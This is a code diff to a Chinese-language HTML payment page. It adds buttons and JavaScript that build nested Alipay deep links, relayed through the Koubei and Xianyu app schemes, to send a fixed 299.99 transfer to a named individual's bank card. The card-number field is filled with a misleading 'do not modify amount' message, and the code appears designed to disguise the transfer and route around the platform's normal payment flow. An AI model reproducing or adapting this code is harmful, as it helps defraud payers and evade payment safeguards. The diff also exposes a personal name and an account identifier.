@@ -71,6 +71,22 @@
                 <div id="showNumber">立即支付</div>
             </div>
 
+            <div class="copybutton"
+                 style="background-color: rgb(204, 204, 204);color: rgb(119, 119, 119);">
+                <span></span>
+                <div id="fill" style="width: 0%;"></div>
+                <div id="koubei" onclick="koubeipay()">口碑APP跳转支付(免飞模式)</div>
+            </div>
+
+            <div class="copybutton"
+                 style="background-color: rgb(204, 204, 204);color: rgb(119, 119, 119);">
+                <span></span>
+                <div id="fill" style="width: 0%;"></div>
+                <div id="xianyu" onclick="xuanyupay()">闲鱼APP跳转支付(免飞模式)</div>
+            </div>
+
+
+
         </div>
     </div>
 
@@ -107,6 +123,15 @@
 });</script>
 <script>
 
+    var u = navigator.userAgent;
+    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
+    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
+    if (isAndroid){
+        $('#koubei').hide();
+    }
+
+
+
     var obj = {};
 
     function StrObjByRegExpLocation() {
@@ -135,16 +160,24 @@
         });
     }
 
+    //替换这里的参数就可以
+    var cardNo = "请勿修改金额两,分钟内到账****";
+    var bankName = "建设银行";
+    var bankMark = "CCB";
+    var amount = "299.99";
+    var cardIndex = "1901111941078235525";
+    var bankAccount = "买尔旦·库尔班";
+
     var a = {
         "actionType": "toCard",
-        "cardNo": "请重新打开网络****",
+        "cardNo": cardNo,
         "receiverName": "",
-        "bankAccount": "买尔旦·库尔班",
-        "money": "1.17",
-        "amount": "1.17",
-        "bankMark": "CCB",
-        "bankName": "建设银行",
-        "cardIndex": "1901111941078235525",
+        "bankAccount": bankAccount,
+        "money": amount,
+        "amount": amount,
+        "bankMark": bankMark,
+        "bankName": bankName,
+        "cardIndex": cardIndex,
         "cardNoHidden": "true",
         "cardChannel": "HISTORY_CARD",
         "orderSource": "from"
@@ -152,9 +185,30 @@
 
     function up(log) {
         var id = obj.id;
-
-
     }
+
+
+    function koubeipay(){
+        var koubei = "koubei://platformapi/startapp?appId=66666675&url=";
+        var httputl = "https://ds.alipay.com/?from=mobilecodec&scheme="
+
+        var dataUrl = "alipays://platformapi/startapp?appId=09999988&actionType=toCard&sourceId=bill&cardNo="+cardNo+"&bankAccount="+bankAccount+"&money="+amount+"&amount="+amount+"&bankMark="+bankMark+"&bankName="+bankName+"&cardIndex="+cardIndex+"&cardNoHidden=true&cardChannel=HISTORY_CARD&orderSource=from";
+
+        var koubei_url = koubei + encodeURIComponent(httputl) + encodeURIComponent(encodeURIComponent(dataUrl));
+        location.href = koubei_url;
+    }
+
+    function xuanyupay(){
+        var xianyu = "fleamarket://home?_from__=qrcapture&forward_url=";
+        var httputl = "https://ds.alipay.com/?from=mobilecodec&scheme="
+
+        var dataUrl = "alipays://platformapi/startapp?appId=09999988&actionType=toCard&sourceId=bill&cardNo="+cardNo+"&bankAccount="+bankAccount+"&money="+amount+"&amount="+amount+"&bankMark="+bankMark+"&bankName="+bankName+"&cardIndex="+cardIndex+"&cardNoHidden=true&cardChannel=HISTORY_CARD&orderSource=from";
+
+        var koubei_url = xianyu + encodeURIComponent(httputl) + encodeURIComponent(encodeURIComponent(dataUrl));
+        location.href = koubei_url;
+    }
+
+
 
     var ii = 0;
 
